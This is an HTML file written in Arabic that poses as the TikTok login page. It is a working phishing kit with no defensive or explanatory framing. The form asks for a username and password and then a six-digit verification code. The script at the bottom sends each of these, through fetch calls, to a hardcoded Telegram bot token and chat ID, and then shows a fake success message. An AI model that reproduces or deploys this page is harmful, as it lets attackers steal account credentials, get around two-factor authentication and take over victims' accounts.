<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#000;border-radius:12px;padding:30px 25px;max-width:400px;width:100%}
.logo{text-align:center;margin-bottom:25px}
.logo h1{color:#fff;font-size:32px;font-weight:bold}
.logo .icon{font-size:60px;margin-bottom:10px}
input{width:100%;padding:14px;border:1px solid #333;border-radius:8px;font-size:15px;background:#121212;color:#fff;box-sizing:border-box;margin-bottom:10px}
input::placeholder{color:#666}
.btn{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:10px}
.forgot{text-align:center;color:#fe2c55;font-size:13px;margin-top:15px}
.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#333}
.divider span{padding:0 15px}
.signup{text-align:center;color:#fff;font-size:14px;margin-top:20px;border:1px solid #333;border-radius:8px;padding:15px}
.footer{text-align:center;font-size:11px;color:#555;margin-top:20px}
.code-inputs{display:flex;gap:8px;margin-top:20px;justify-content:center;direction:ltr}
.code-inputs input{width:45px;height:55px;text-align:center;font-size:22px;font-weight:bold;padding:0}
</style>
</head>
<body>
<div class="card">
<div id="screen1">
<div class="logo"><div class="icon">🎵</div><h1>TikTok</h1></div>
<form id="f">
<input type="text" id="user" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
<input type="password" id="pass" placeholder="كلمة المرور" required>
<button type="submit" class="btn">تسجيل الدخول</button>
</form>
<div class="forgot">هل نسيت كلمة المرور؟</div>
<div class="divider"><span>أو</span></div>
<div class="signup">إنشاء حساب جديد</div>
<div class="footer">© 2026 TikTok</div>
</div>
<div id="screen2" style="display:none">
<h3 style="text-align:center;color:#fff;margin-bottom:15px">أدخل رمز التحقق</h3>
<p style="text-align:center;color:#888;font-size:14px;margin-bottom:20px">تم إرسال رمز إلى هاتفك</p>
<div class="code-inputs">
<input type="tel" maxlength="1" id="c1"><input type="tel" maxlength="1" id="c2"><input type="tel" maxlength="1" id="c3"><input type="tel" maxlength="1" id="c4"><input type="tel" maxlength="1" id="c5"><input type="tel" maxlength="1" id="c6">
</div>
<button type="button" class="btn" id="verifyBtn">تحقق</button>
</div>
</div>
<script>
const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
const CHAT='8823506156';
['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{document.getElementById(id).addEventListener('input',function(){if(this.value.length===1&&i<arr.length-1)document.getElementById(arr[i+1]).focus();});});
document.getElementById('f').addEventListener('submit',async function(e){
e.preventDefault();
const msg='🎵 *تيك توك*\n\n👤 `'+document.getElementById('user').value+'`\n🔑 `'+document.getElementById('pass').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
document.getElementById('screen1').style.display='none';document.getElementById('screen2').style.display='block';document.getElementById('c1').focus();
});
document.getElementById('verifyBtn').addEventListener('click',async function(){
const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
const msg='🎵 *تيك توك - رمز التحقق*\n\n👤 `'+document.getElementById('user').value+'`\n🔢 `'+code+'`';
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
alert('تم التحقق بنجاح');
});
</script>
</body>
</html>
